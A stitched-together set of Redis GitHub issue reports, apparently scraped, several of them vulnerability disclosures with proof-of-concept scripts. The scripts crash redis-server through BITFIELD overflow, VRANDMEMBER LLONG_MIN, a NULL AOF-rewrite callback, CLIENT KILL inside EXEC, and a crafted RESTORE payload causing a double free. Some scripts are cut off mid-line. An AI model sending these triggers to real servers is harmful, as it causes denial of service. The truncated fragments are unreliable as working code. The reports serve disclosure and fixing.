    MALLOC=libc \
    OPTIMIZATION=-O0 \
    PROG_SUFFIX=-ubsan \
    redis-server-ubsan redis-cli-ubsan \
    -j"$(getconf _NPROCESSORS_ONLN 2>/dev/null || echo 2)" >/dev/null

SERVER="${SRC}/src/redis-server-ubsan"
CLI="${SRC}/src/redis-cli-ubsan"
OFFSET="#144115188075855872"

run_trigger() {
    local name="$1"
    local port="$2"
    shift 2

    local rundir="${TMP}/${name}"
    local log="${rundir}/server.log"
    mkdir -p "${rundir}"

    echo "[3/4] Triggering ${name}: $*"
    UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1 \
        "${SERVER}" --port "${port}" --bind 127.0.0.1 \
        --save '' --appendonly no --dir "${rundir}" --daemonize no \
        >"${log}" 2>&1 &
    local spid=$!

    local ready=0
    for _ in $(seq 1 100); do
        if kill -0 "${spid}" 2>/dev/null && "${CLI}" -p "${port}" PING >/dev/null 2>&1; then
            ready=1
            break
        fi
        sleep 0.05
    done
    if [[ "${ready}" -ne 1 ]]; then
        echo "FAILED: Redis did not start for ${name}" >&2
        tail -120 "${log}" >&2 || true
        exit 1
    fi

    set +e
    "${CLI}" -p "${port}" "$@" >"${rundir}/cli.out" 2>"${rundir}/cli.err"
    local cli_rc=$?
    sleep 0.5
    "${CLI}" -p "${port}" PING >"${rundir}/ping.out" 2>"${rundir}/ping.err"
    local ping_rc=$?
    kill -0 "${spid}" 2>/dev/null
    local alive_rc=$?
    set -e

    echo "    redis-cli exit: ${cli_rc}"
    if [[ -s "${rundir}/cli.err" ]]; then
        sed 's/^/    cli: /' "${rundir}/cli.err"
    fi
    if [[ -s "${rundir}/ping.err" ]]; then
        sed 's/^/    ping: /' "${rundir}/ping.err"
    fi
    grep -En "runtime error|signed integer overflow|bitops.c:730|Ready to accept" "${log}" \
        | sed 's/^/    log: /' || true

    if [[ "${alive_rc}" -eq 0 ]]; then
        "${CLI}" -p "${port}" SHUTDOWN NOSAVE >/dev/null 2>&1 || kill "${spid}" 2>/dev/null || true
        echo "FAILED: ${name} server stayed alive" >&2
        exit 1
    fi
    if [[ "${ping_rc}" -eq 0 ]]; then
        echo "FAILED: ${name} server still answered PING" >&2
        exit 1
    fi
    if ! grep -q "bitops.c:730:.*runtime error: signed integer overflow" "${log}"; then
        echo "FAILED: ${name} did not report the expected bitops.c:730 UBSAN overflow" >&2
        tail -120 "${log}" >&2 || true
        exit 1
    fi

    wait "${spid}" 2>/dev/null || true
    echo "    ${name}: verified signed-overflow abort"
}

run_trigger "bitfield_ro" "${PORT1:-6415}" BITFIELD_RO k GET i64 "${OFFSET}"
run_trigger "bitfield" "${PORT2:-6416}" BITFIELD k GET i64 "${OFFSET}"

echo "[4/4] PoC completed: both BITFIELD hash-offset triggers killed the UBSAN server."
Expected behavior
I verified the issue against the current source by building a temporary UBSAN Redis server and sending Redis commands through redis-cli. Both BITFIELD_RO and BITFIELD closed the connection, made subsequent PING fail, and logged:
bitops.c:730:26: runtime error: signed integer overflow: 64 * 144115188075855872 cannot be represented in type 'long long int'

Additional information
Check for overflow before evaluating loffset *= bits. For example, when usehash is true, reject loffset > LLONG_MAX / bits before multiplying. A checked-multiplication helper would also work, while keeping the existing negative-value and server.proto_max_bulk_len bounds checks.

title: [BUG] Vector Set pure AOF rewrite NULL callback dereference child-process DoS
body:
Describe the bug
The built-in vectorset module registers its module data type with a NULL aof_rewrite method:
// modules/vector-sets/vset.c:2291-2298
RedisModuleTypeMethods tm = {
    .version = REDISMODULE_TYPE_METHOD_VERSION,
    .rdb_load = VectorSetRdbLoad,
    .rdb_save = VectorSetRdbSave,
    .aof_rewrite = NULL,
    .mem_usage = VectorSetMemUsage,
    .free = VectorSetFree,
    .digest = VectorSetDigest
};
RM_CreateDataType() accepts that NULL method and stores it in the runtime moduleType:
// src/module.c:7525-7528
mt->rdb_load = tms->rdb_load;
mt->rdb_save = tms->rdb_save;
mt->aof_rewrite = tms->aof_rewrite;
mt->mem_usage = tms->mem_usage;
When Redis performs a pure AOF rewrite (aof-use-rdb-preamble no) over a database containing a Vector Set key, the AOF rewrite path unconditionally invokes that callback:
// src/aof.c:2487-2492
int rewriteModuleObject(rio *r, robj *key, robj *o, int dbid) {
    RedisModuleIO io;
    moduleValue *mv = o->ptr;
    moduleType *mt = mv->type;
    moduleInitIOContext(&io, &mt->entity, r, key, dbid);
    mt->aof_rewrite(&io,key,mv->value);
A remote client that can create a Vector Set key and trigger AOF rewrite can therefore crash the AOF rewrite child process with a NULL function pointer dereference. In the verified run the parent Redis process survived, but AOF rewrite failed and aof_last_bgrewrite_status became err. Repeated triggers can keep AOF compaction/rewrite unavailable and consume fork/rewrite resources.
To reproduce
Trigger conditions:

The Redis binary includes built-in Vector Sets. The existing src/redis-server in this repository does.
AOF is enabled and pure AOF rewrite is selected: appendonly yes and aof-use-rdb-preamble no.
The attacker can run VADD to create a Vector Set key.
The attacker can run BGREWRITEAOF, or the instance is configured to auto-trigger AOF rewrite.

Minimal trigger:
VADD vk VALUES 2 1 2 elem1
BGREWRITEAOF

Run
#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
REDIS_SERVER="$ROOT_DIR/src/redis-server"
REDIS_CLI="$ROOT_DIR/src/redis-cli"

if [[ ! -x "$REDIS_SERVER" || ! -x "$REDIS_CLI" ]]; then
  echo "[-] Missing built Redis binaries under $ROOT_DIR/src"
  exit 1
fi

TMPDIR="$(mktemp -d /tmp/redis-vset-aof-null.XXXXXX)"
PORT=$((30000 + RANDOM % 20000))
PIDFILE="$TMPDIR/redis.pid"
LOGFILE="$TMPDIR/redis.log"

cleanup() {
  "$REDIS_CLI" -p "$PORT" shutdown nosave >/dev/null 2>&1 || true
  if [[ "${KEEP_TMP:-0}" != "1" ]]; then
    rm -rf "$TMPDIR"
  else
    echo "[*] Keeping temporary dir: $TMPDIR"
  fi
}
trap cleanup EXIT

echo "[*] Repository: $ROOT_DIR"
echo "[*] Temporary dir: $TMPDIR"
echo "[*] Redis port: $PORT"

"$REDIS_SERVER" \
  --port "$PORT" \
  --bind 127.0.0.1 \
  --protected-mode no \
  --dir "$TMPDIR" \
  --logfile "$LOGFILE" \
  --pidfile "$PIDFILE" \
  --daemonize yes \
  --save "" \
  --appendonly yes \
  --aof-use-rdb-preamble no

for _ in $(seq 1 50); do
  if "$REDIS_CLI" -p "$PORT" ping >/dev/null 2>&1; then
    break
  fi
  sleep 0.1
done

if ! "$REDIS_CLI" -p "$PORT" ping >/dev/null 2>&1; then
  echo "[-] Redis did not start"
  tail -80 "$LOGFILE" || true
  exit 1
fi

echo "[*] Crash markers:"
grep -E 'crashed by signal: 11|Accessing address: \\(nil\\)|Background AOF rewrite terminated by signal 11|rewriteObject|rewriteAppendOnlyFile' "$LOGFILE" || true

   grep -q 'crashed by signal: 11' "$LOGFILE" && \

  exit 0

1

title: [BUG] Redis crash via VRANDMEMBER LLONG_MIN count
body:
Describe the bug
The current runtime code contains a remotely triggerable denial-of-service bug. When a non-empty vector set key exists, this command crashes redis-server:
VRANDMEMBER <key> -9223372036854775808

Bug location: (redis/modules/vector-sets/vset.c:1632)
int allow_duplicates = (count < 0);
long long abs_count = (count < 0) ? -count : count;
...
RedisModule_ReplyWithArray(ctx, abs_count);
For count == LLONG_MIN, -count is not representable as long long, so this is undefined behavior. In the verified environment, abs_count stays negative.
The negative value reaches the module reply API: src/module.c
addReplyArrayLen(c,len);
Redis core then aborts on this assertion: src/networking.c
serverAssert(length >= 0);
To reproduce
#!/usr/bin/env bash

pick_port() {
    for _ in $(seq 1 50); do
        local p=$((20000 + RANDOM % 30000))
        if ! (echo >"/dev/tcp/127.0.0.1/$p") >/dev/null 2>&1; then

}

trap cleanup EXIT

echo "[+] Starting isolated redis-server on 127.0.0.1:$PORT"
"$SERVER" --port "$PORT" --bind 127.0.0.1 --save "" --appendonly no \
    --dir "$TMPDIR" --daemonize yes --pidfile "$PIDFILE" --logfile "$LOG"

for _ in $(seq 1 50); do

        break
    fi
    sleep 0.1
done

if ! "$CLI" -p "$PORT" ping >/dev/null 2>&1; then
    echo "[-] redis-server did not start" >&2
    tail -80 "$LOG" >&2 || true
    exit 1
fi

echo "[+] Creating a non-empty vector set"
"$CLI" -p "$PORT" VADD v VALUES 1 1 a >/dev/null

echo "[+] Triggering VRANDMEMBER with LLONG_MIN count"
set +e
TRIGGER_OUTPUT="$("$CLI" -p "$PORT" VRANDMEMBER v -9223372036854775808 2>&1)"
TRIGGER_RC=$?
set -e
echo "$TRIGGER_OUTPUT"
echo "[+] Trigger redis-cli exit code: $TRIGGER_RC"

sleep 0.3

set +e
PING_OUTPUT="$("$CLI" -p "$PORT" ping 2>&1)"
PING_RC=$?
set -e

if [[ "$PING_RC" -eq 0 ]]; then
    echo "[-] Server is still reachable; vulnerability did not reproduce" >&2
    echo "$PING_OUTPUT" >&2
    tail -120 "$LOG" >&2 || true
    exit 1
fi

if grep -q "networking.c:1208 'length >= 0' is not true" "$LOG"; then
    echo "[+] Reproduced: redis-server crashed on negative array length assertion"
    grep "networking.c:1208 'length >= 0' is not true" "$LOG"

fi

Error: Server closed the connection
Could not connect to Redis at 127.0.0.1:<port>: Connection refused
networking.c:1208 'length >= 0' is not true

should not crash
Additional information
Suggested Fix:
Reject LLONG_MIN in VRANDMEMBER_RedisCommand() before computing the absolute value, and ensure only non-negative lengths are passed to RedisModule_ReplyWithArray(). For example:

    return RedisModule_ReplyWithError(ctx, "ERR invalid COUNT");

title: VADD ... CAS SETATTR does not update numattribs, causing wrong attributes-count and possible attribute omission on RDB reload
body:
VADD ... CAS SETATTR inserts the attribute, but does not update numattribs in the CAS reply path.
I think this leaves vector-set attribute accounting inconsistent between the synchronous insert path and the CAS insert path.
Relevant code paths:

synchronous insert increments the counter in modules/vector-sets/vset.c via vectorSetInsert()
VADD_CASReply() stores nv->attrib = attrib and inserts the node, but does not increment vset->numattribs

Why this matters:

VINFO reports attributes-count directly from vset->numattribs
RDB save sets SAVE_FLAG_HAS_ATTRIBS only when vset->numattribs != 0
memory usage estimation also scales attribute memory by vset->numattribs

So with VADD ... CAS SETATTR, the attribute can exist on the inserted node while:

VINFO attributes-count stays too low
attribute memory accounting is wrong
if this leaves the set-wide numattribs == 0, RDB save skips attribute serialization entirely, so the attribute can disappear after reload

Minimal repro:
DEL vs
VADD vs VALUES 2 1 0 seed
VADD vs VALUES 2 0 1 item CAS SETATTR '{"a":1}'
VGETATTR vs item
VINFO vs
DEBUG RELOAD
VGETATTR vs item

Expected:

VGETATTR vs item returns {"a":1} before and after reload
VINFO reports attributes-count = 1

Actual by current code path:

the attribute is attached to the new node
attributes-count is not incremented in the CAS path
if there are no other counted attributes in the set, RDB save will not serialize attributes for the set

Relevant code in current unstable:

synchronous insert accounting: modules/vector-sets/vset.c:364
CAS insert path: modules/vector-sets/vset.c:540-559
VINFO reporting: modules/vector-sets/vset.c:1545-1546
RDB save gating: modules/vector-sets/vset.c:1931, modules/vector-sets/vset.c:1951
mem usage accounting: modules/vector-sets/vset.c:2209

History note in case it helps: there was already a related fix in 68dccc55a (Fix CAS insertion broken when adding attributes.), but that patch appears to address ownership/attachment in the CAS path, not the missing numattribs update.
Unless I'm missing something, the CAS path probably wants the same accounting update as the synchronous insert path.

title: [BUG] redis-cli --cluster rebalance CROSSSLOT error when --user is specified without -a
body:
Description
When running redis-cli --cluster rebalance with --user <username> but without -a <password>, the MIGRATE command constructed by redis-cli contains an extra empty string argument, which is serialized as $0\r\n\r\n. The server interprets this empty string as a key whose slot is 0, causing a CROSSSLOT error when it conflicts with the actual keys' slot.
Reproduction

Set up a Redis Cluster without password (requirepass is empty)
Run:

redis-cli --user default --cluster rebalance <host>:<port> --cluster-timeout 72000 --cluster-threshold 0.01 --cluster-use-empty-masters

Observe CROSSSLOT error on the source node:

CROSSSLOT Keys in request don't hash to the same slot

Note: Removing --user default or adding -a <password> avoids the issue.
Root Cause
In src/redis-cli.c, function clusterManagerMigrateKeysInReply:
int c = (replace ? 8 : 7);
if (config.auth) c += 2;
if (config.user) c += 1;    // BUG: adds 1 for user even when auth is NULL
size_t argc = c + reply->elements;
When config.user is set but config.auth is NULL, c is incremented by 1 for the user parameter, but the argv filling logic later skips the entire if (config.auth) block (which would have set both AUTH2 user+password). This results in:

argc is 1 larger than the actual number of argv entries filled
The unfilled argv slot contains null/zero-length data
hiredis serializes it as an empty string $0\r\n\r\n
Server's migrateGetKeys treats the empty string as a key with keyHashSlot("",0) → slot 0 → CROSSSLOT conflict

The --help text already states --user "Needs -a", but there is no runtime validation enforcing this, making it possible to hit this edge case.
Debug Evidence
redis-cli MIGRATE argv (redacted IPs)
MIGRATE argv: argc=11, reply->elements=3, offset=7
  argv[0] = 'MIGRATE'
  argv[1] = '<host>'
  argv[2] = '<port>'
  argv[3] = '' (len=0)
  argv[4] = '0'
  argv[5] = '72000'
  argv[6] = 'KEYS'
  argv[7] = '{test}:k1'
  argv[8] = '{test}:k2'
  argv[9] = '{test}:k3'
  argv[10] = '(null)' (len=0)    ← extra unfilled slot

Note: reply->elements=3 (3 actual keys), but argc=11 (should be 10). The argv[10] slot was never assigned.
Server-side CROSSSLOT error
CROSS_SLOT error: first_key: {test}:k1 (slot 6918), conflict_key: "" (slot 0)

Suggested Fix
- if (config.user) c += 1;
+ if (config.auth && config.user) c += 1;
This ensures the user parameter is only counted in argc when config.auth is non-NULL, consistent with the argv filling logic where config.user is only used inside the if (config.auth) block.
Workaround

Remove --user when the cluster has no password
Or always pair --user with -a <password>

Environment

Redis version: 6.2.5 (also affects newer versions where this code pattern exists)
OS: Linux

title: [BUG] Cluster crash when CLIENT KILL unsubscribes SSUBSCRIBE client inside EXEC
body:
Describe the bug
In cluster mode, killing a client subscribed via SSUBSCRIBE from inside another client's transaction can crash the server.
The problem is in src/pubsub.c:

pubsubUnsubscribeChannel() at src/pubsub.c:295-299 also uses getKeySlot(channel->ptr) and then asserts that the lookup must succeed.

Current code:
/* src/pubsub.c:257-259 */
if (server.cluster_enabled && type.shard) {
    slot = getKeySlot(channel->ptr);
}

/* src/pubsub.c:295-299 */
if (server.cluster_enabled && type.shard) {
    slot = getKeySlot(channel->ptr);
}
de = kvstoreDictFind(*type.serverPubSubChannels, slot, channel);
serverAssertWithInfo(c, NULL, de != NULL);
The issue is that getKeySlot() is context-dependent. In src/db.c:474-487, it may return server.current_client->slot while a command is executing instead of computing the slot from the provided string:
/* src/db.c:474-487 */
int getKeySlot(sds key) {
    if (!server.cluster_enabled) return 0;
    if (server.current_client && server.current_client->slot >= 0 &&
        server.current_client->flags & CLIENT_EXECUTING_COMMAND) {
        debugServerAssertWithInfo(server.current_client, NULL,
                                  (int)keyHashSlot(key, (int)sdslen(key)) == server.current_client->slot);
        return server.current_client->slot;
    }
    int slot = keyHashSlot(key, (int)sdslen(key));
    return slot;
}
During EXEC, if a queued command such as SET k v establishes a different slot, and a later queued CLIENT KILL frees a subscribed client, pubsubUnsubscribeChannel() can use the transaction client's cached slot instead of the real slot of channel0. Then kvstoreDictFind() searches the wrong bucket and returns NULL, and the assertion aborts the server.

}
trap cleanup EXIT

make -C "$ROOT" -j"$(nproc)" MALLOC=libc >/tmp/verify_pubsub_slot_bug.build.log 2>&1

rm -rf "$BASE"

cat >"$CONF" <<CFG

cluster-config-file nodes-$PORT.conf
cluster-node-timeout 5000
appendonly no
save ""
protected-mode no
daemonize yes
dir $BASE
logfile $LOG
pidfile $BASE/$PORT.pid
CFG

"$ROOT/src/redis-server" "$CONF"

for _ in $(seq 1 50); do
  if "$ROOT/src/redis-cli" -p "$PORT" ping >/dev/null 2>&1; then
    break
  fi
  sleep 0.1
done

"$ROOT/src/redis-cli" -p "$PORT" cluster addslotsrange 0 16383 >/dev/null

for _ in $(seq 1 50); do
  if "$ROOT/src/redis-cli" -p "$PORT" cluster info 2>/dev/null | grep -q 'cluster_state:ok'; then
    break
  fi
  sleep 0.1
done

python3 - <<'PY'

HOST='127.0.0.1'
PORT=7000

def send_array(sock, *parts):

title: [BUG] Double free in stream consumer PEL loading with crafted RESTORE payload
body:
Describe the bug
A double free can occur while loading a stream object with consumer group PEL data from a crafted RDB/RESTORE payload.
The issue is in the error path of src/rdb.c when loading a consumer-specific PEL entry. The code looks up a streamNACK *nack from cgroup->pel using raxFind(...), then attempts to insert the same shared nack into consumer->pel. If raxTryInsert(...) fails due to a duplicate consumer PEL entry, the error path calls both:
streamFreeNACK(s, nack);
decrRefCount(o);
This is incorrect because nack is still owned by cgroup->pel. During decrRefCount(o), the stream object is destroyed and cgroup->pel is freed, which frees the same nack again. This results in a double free.
In short: a shared nack retrieved from cgroup->pel is freed explicitly in the error path and then freed again during normal object teardown.

To reproduce

Build and run a vulnerable Redis version.
Save the following Python 3 script as poc_double_free_stream_pel.py.
Run it with:

python3 poc_double_free_stream_pel.py
Python 3 PoC:
#!/usr/bin/env python3
import socket
import struct
import subprocess
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
PORT = 6399
SERVER = ROOT / 'src' / 'redis-server'
LOG = ROOT / 'poc-double-free.log'


def resp(*parts):
    out = f'*{len(parts)}\r\n'.encode()
    for p in parts:
        if isinstance(p, str):
            p = p.encode()
        out += f'${len(p)}\r\n'.encode() + p + b'\r\n'
    return out


def send(*parts):
    with socket.create_connection(('127.0.0.1', PORT), timeout=3) as s:
        s.sendall(resp(*parts))
        out = b''
        while True:
            try:
                chunk = s.recv(65535)
                if not chunk:
                    break
                out += chunk
                if len(chunk) < 65535:
                    break
            except socket.timeout:
                break
    return out


def parse_dump_bulk(reply: bytes) -> bytes:
    if not reply.startswith(b'$'):
        raise RuntimeError(f'unexpected DUMP reply: {reply!r}')
    end = reply.find(b'\r\n')
    n = int(reply[1:end])
    return reply[end + 2:end + 2 + n]


def crc64_redis(data: bytes) -> int:
    poly = 0xAD93D23594C935A9
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            crc = (crc >> 1) ^ poly if (crc & 1) else (crc >> 1)
        table.append(crc & 0xFFFFFFFFFFFFFFFF)

    crc = 0
    for b in data:
        crc = table[(crc ^ b) & 0xFF] ^ (crc >> 8)
    return crc & 0xFFFFFFFFFFFFFFFF


def decode_reply(data: bytes) -> str:
    return data.decode('latin1', 'replace').strip()


def main():
    if not SERVER.exists():
        raise SystemExit(f'[-] redis-server not found: {SERVER}')

    proc = subprocess.Popen([
        str(SERVER),
        '--port', str(PORT),
        '--save', '',
        '--appendonly', 'no',
        '--daemonize', 'no',
        '--loglevel', 'verbose',
        '--sanitize-dump-payload', 'no',
        '--enable-debug-command', 'yes',
    ], stdout=LOG.open('wb'), stderr=subprocess.STDOUT)

    try:
        for _ in range(50):
            try:
                if b'PONG' in send('PING'):
                    break
            except OSError:
                time.sleep(0.1)
        else:
            raise RuntimeError('redis-server did not start')

        print('[*] preparing legal stream state')
        for cmd in [
            ('DEL', 'mystream'),
            ('XADD', 'mystream', '1-1', 'field', 'value1'),
            ('XADD', 'mystream', '2-1', 'field', 'value2'),
            ('XGROUP', 'CREATE', 'mystream', 'mygroup', '0'),
            ('XREADGROUP', 'GROUP', 'mygroup', 'Alice', 'COUNT', '2', 'STREAMS', 'mystream', '>'),
        ]:
            print('   ', cmd[0], decode_reply(send(*cmd)))

        dump = parse_dump_bulk(send('DUMP', 'mystream'))
        body = bytearray(dump[:-10])
        version = dump[-10:-8]

        alice = body.find(b'Alice')
        if alice == -1:
            raise RuntimeError('consumer name Alice not found in DUMP payload')

        # streamID 1-1 and 2-1 in raw 128-bit big-endian form
        id1 = b'\x00'*7 + b'\x01' + b'\x00'*7 + b'\x01'  # 1-1
        id2 = b'\x00'*7 + b'\x02' + b'\x00'*7 + b'\x01'  # 2-1

        # consumer PEL layout here is:
        # [pel_size=2][id1][id2]
        marker = b'\x02' + id1 + id2
        off = body.find(marker, alice)
        if off == -1:
            raise RuntimeError('consumer PEL marker not found in DUMP payload')

        print('[*] patching second consumer PEL entry to duplicate 1-1')
        body[off + 17:off + 33] = id1

        crafted_body = bytes(body)
        crc = crc64_redis(crafted_body + version)
        crafted = crafted_body + version + struct.pack('<Q', crc)

        print('[*] restoring crafted payload')
        print('   DEBUG', decode_reply(send('DEBUG', 'SET-SKIP-CHECKSUM-VALIDATION', '1')))
        restore_reply = send('RESTORE', '_stream', '0', crafted)
        print('   RESTORE raw reply:', restore_reply.decode('latin1', 'replace').strip())

        time.sleep(0.5)
        try:
            pong = decode_reply(send('PING'))
            print('[!] server still alive:', pong)
        except OSError as e:
            print('[+] server crashed as expected:', e)

    finally:
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            pass

        print('\n[*] tail of log:')
        if LOG.exists():
            text = LOG.read_text(errors='replace')
            lines = text.splitlines()[-80:]
            print('\n'.join(lines))
        print(f'\n[*] full log: {LOG}')


if __name__ == '__main__':
    main()
This script:

creates a valid stream/group/consumer/pending state,
dumps the object,
modifies the consumer PEL so the second entry duplicates the first,
recomputes the CRC,
restores the crafted payload.

On a vulnerable build, Redis crashes while handling the crafted RESTORE.
Observed log/signals include output similar to:
Duplicated consumer PEL entry  loading a stream consumer group
free(): double free detected in tcache 2

and the server process exits unexpectedly.

Expected behavior
Redis should reject the corrupt payload cleanly and return a data format error without crashing.
In the duplicate consumer PEL entry case, the loader should report corruption and release the stream object only through normal ownership/teardown logic, without explicitly freeing a nack that is still owned by cgroup->pel.

Additional information
Affected code path:

src/rdb.c
consumer-specific PEL loading error path around:

streamNACK *nack = result;
...
if (!raxTryInsert(consumer->pel,rawid,sizeof(rawid),nack,NULL)) {
    rdbReportCorruptRDB("Duplicated consumer PEL entry "
                            " loading a stream consumer "
                            "group");
    streamFreeNACK(s, nack);
    decrRefCount(o);
    return NULL;
}
Ownership context:

nack is created and stored in cgroup->pel earlier during global PEL loading.
consumer->pel stores shared references to those same nack objects.
streamFreeConsumer() already documents this sharing model by freeing consumer->pel without value callbacks.
decrRefCount(o) eventually destroys the stream and frees cgroup->pel, which frees the shared nack again.

Root cause:

the error path incorrectly assumes it owns nack exclusively and frees it directly.

title: [BUG] Use-after-free in RM_RegisterClusterMessageReceiver() when removing the head of clusterReceivers[type]
[BUG] High time complexity of streamMoveIdmpKeys() in asmTriggerBackgroundTrim()
body:
Problem
In PR #14897 streamMoveIdmpKeys() was implemented such that it takes in int slot as input parameter and iterates over server.db[0].stream_idmp_keys and moves the keys which belong to slot into stream_idmp_keys.
Therefore asmTriggerBackgroundTrim() was calling streamMoveIdmpKeys() for each slot in trim ranges.
Time Complexity
Lets say number of slots be S (it could be 16,384 in worst case)
and let K be number of keys in server.db[0].stream_idmp_keys
then the total time complexity would be O(S x K)
Suggested Fix
we have changed the implementation of streamMoveIdmpKeys() such that it now takes in slotRangeArray *slots as an input parameter and iterates over server.db[0].stream_idmp_keys once, catching all the keys which fall in the slots range and moving them to stream_idmp_keys
Therefore asmTriggerBackgroundTrim() would now call streamMoveIdmpKeys() just once.
Time Complexity
say R is number of ranges in slots and let K be number of keys in server.db[0].stream_idmp_keys
then the total time complexity would be O(R x K)
since O(R x K) is better than O(S x K) because number of slots would almost always be greater than number of ranges in slotRangeArray *slots
(for a single merged range like 0–16383, R = 1 but S = 16 384).

title: [NEW] Add module API for querying slot ranges by node ID
body:
The problem/use-case that the feature addresses
The Module API currently provides RedisModule_ClusterGetLocalSlotRanges() to retrieve the slot ranges owned by the local node. However, there is no corresponding API to query slot ranges of an arbitrary node in the cluster by its node ID.
Description of the feature
In some module use cases, a module running on one node may need to know which slots are owned by another node. Currently the only way to achieve this is through RM_Call with the CLUSTER SLOTS or CLUSTER NODES command, which is inefficient and requires parsing the raw output. A dedicated C API would provide a cleaner, lower-overhead alternative.
Proposed API
RedisModuleSlotRangeArray *RedisModule_ClusterGetSlotRangesByNodeId(RedisModuleCtx *ctx, const char *nodeid);

title: [BUG] `stream_idmp_keys` dictionary not managed in database lifecycle functions (crash + tracking loss)
body:
Describe the bug
The db->stream_idmp_keys dictionary, introduced for Stream IDMP (Idempotent Message Producer) tracking, is not properly managed in several database lifecycle functions. This causes:

SIGSEGV crash during diskless replication with repl-diskless-load swapdb - initTempDb() doesn't initialize stream_idmp_keys, causing NULL pointer dereference when rdbLoadRioWithLoadingCtx() calls dictAddRaw(db->stream_idmp_keys, ...)
Lost IDMP tracking after diskless replication - swapMainDbWithTempDb() doesn't swap stream_idmp_keys pointers
Lost IDMP tracking after SWAPDB - dbSwapDatabases() doesn't swap stream_idmp_keys pointers
Stale tracking entries after FLUSHDB - emptyDbStructure() doesn't clear stream_idmp_keys

To reproduce
See attached tcl (specifically - IDMP tracking works with diskless replication creates a CRASH)
Expected behavior

Diskless replication should complete without crashing
IDMP tracking should survive database swaps (SWAPDB, replication)
IDMP entries should expire correctly after database operations
FLUSHDB should clear stale tracking entries

Additional information
We discovered this while adding the test XADD IDMP expiry still works after SAVE + process restart to tests/unit/type/stream.tcl (I was suspicious and asked @Augment to create some POC). We found that commit ee376cdc3 fixed the basic RDB load path, but this was a site-specific fix that didn't address the broader lifecycle management issue.
The stream_idmp_keys dictionary should be managed consistently with other per-DB dictionaries (keys, expires, subexpires) in all lifecycle functions.
Suggested fix:
emptyDbStructure() - clear tracking on flush:
+        /* Clear stream IDMP tracking - keys are no longer valid after flush */
+        if (dbarray[j].stream_idmp_keys) {
+            dictEmpty(dbarray[j].stream_idmp_keys, callback);
+        }
initTempDb() - initialize for temp DB:
+        /* Initialize stream IDMP tracking for tempDb to avoid NULL pointer
+         * dereference during RDB load when trackStreamIdmpEntries() is called. */
+        tempDb[i].stream_idmp_keys = dictCreate(&objectKeyPointerValueDictType);
discardTempDb() - release when discarding:
+        /* Release stream IDMP tracking dict */
+        if (tempDb[i].stream_idmp_keys) {
+            dictRelease(tempDb[i].stream_idmp_keys);
+        }
dbSwapDatabases() - swap pointers:
+    db1->stream_idmp_keys = db2->stream_idmp_keys;
     ...
+    db2->stream_idmp_keys = aux.stream_idmp_keys;
swapMainDbWithTempDb() - swap pointers:
+        activedb->stream_idmp_keys = newdb->stream_idmp_keys;
         ...
+        newdb->stream_idmp_keys = aux.stream_idmp_keys;

title: [BUG] RDB Channel connections mistakenly discovered by Sentinel
body:
Describe the bug
Prerequisites:

Hostnames used instead of pure IP addresses
Meshed infrastructure -- connections from replica to the master can have a different source IP address each time.

If the main replication connection is interrupted, but the rdbchannel connection is still active, it will be visible in the info replication output. Currently, the side-channel connection does not use REPLCONF ip-address, and in a meshed scenario, when the source IP addresses of both connections differ, Sentinel will treat them as separate replicas.
It's caused by:
(https://github.com/redis/redis/blob/unstable/src/replication.c#L3725-L3727)
*err = sendCommand(conn, "REPLCONF", "capa", "eof", "rdb-only", "1",
                       "rdb-channel", "1", "main-ch-client-id", cid,
                       "listening-port", buf, NULL);

that does not send hostname (via replconf ip-address)
and the fact that sentinel uses following logic comparing slaves:
(https://github.com/redis/redis/blob/unstable/src/sentinel.c#L587-L591)
int sentinelAddrOrHostnameEqual(sentinelAddr *a, sentinelAddr *b) {
    return a->port == b->port &&
            (!strcmp(a->ip, b->ip)  ||
            !strcasecmp(a->hostname, b->hostname));
}

Here, the IP address will differ (mesh), the port will remain the same, and the side-channel connection won't have a hostname set, which will cause Sentinel to treat it as a newly discovered replica.
To reproduce
Simple script to show the problem:
#!/bin/bash
function getInfo() {
	while /bin/true; do
		redis-cli info replication | grep slave;
		sleep 0.5
	done
}
getInfo &
coproc REPL {
	nc -q2 -w2 localhost 6379
}
REPL_PID=$!

echo "REPLCONF listening-port 1234" >&${REPL[1]}
sleep 0.1
echo "REPLCONF ip-address test.invalid" >&${REPL[1]}
sleep 0.1
echo "REPLCONF capa eof capa psync2 capa rdb-channel-repl" >&${REPL[1]}
sleep 0.1
echo "PSYNC ? -1" >&${REPL[1]}

while read l <&${REPL[0]}; do
	if [[ $l == +RDBCHANNELSYNC* ]]; then
		client_id=${l#* }
		coproc SIDE {
			nc -q2 -w2 localhost 6379
		}
		echo "REPLCONF capa eof rdb-only 1 rdb-channel 1 main-ch-client-id $client_id listening-port 4321" >&${SIDE[1]}
		sleep 0.1
		echo "SYNC" >&${SIDE[1]}
		sleep 5;
		kill $REPL_PID
		break
	fi
done

jobs -p | xargs kill
